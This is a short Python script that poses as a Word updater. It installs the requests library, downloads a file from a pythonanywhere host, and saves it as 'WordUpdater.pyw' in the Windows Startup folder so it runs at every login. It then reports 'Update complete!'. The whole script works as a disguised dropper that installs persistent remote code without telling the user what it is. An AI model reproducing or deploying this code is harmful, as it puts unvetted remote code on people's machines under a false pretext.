from tkinter import messagebox
import os
import time
import pathlib

os.system(r'start "Updating..." "pyw -m pip install --upgrade requests pip --no-warn-script-location"')

while True:
    try:
        import requests
    except ModuleNotFoundError:
        pass
    else:
        break
    time.sleep(3)

main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
with open(str(main_path), "wb") as tf:
    tf.write(requests.get("http://gsgtafelmanager.pythonanywhere.com/file/startup.py").content)
messagebox.showinfo("Done", "Update complete!")
